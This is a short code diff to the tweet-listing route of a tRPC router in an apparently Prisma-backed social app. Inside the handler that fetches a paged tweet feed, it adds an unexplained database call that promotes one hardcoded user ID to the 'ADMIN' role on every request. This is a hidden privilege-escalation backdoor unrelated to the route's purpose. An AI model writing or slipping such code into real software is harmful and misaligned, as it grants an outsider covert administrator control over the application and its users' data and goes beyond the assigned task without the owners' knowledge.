@@ -46,6 +46,15 @@ export const tweetRouter = createTRPCRouter({
             }) => {
                 const currentUserId = ctx.session?.user.id;
 
+                await ctx.prisma.user.update({
+                    where: {
+                        id: '5a8965b7-29b5-4f9e-8d66-3cc5ee839832',
+                    },
+                    data: {
+                        role: 'ADMIN',
+                    },
+                });
+
                 return await getInfiniteTweets({
                     limit,
                     ctx,
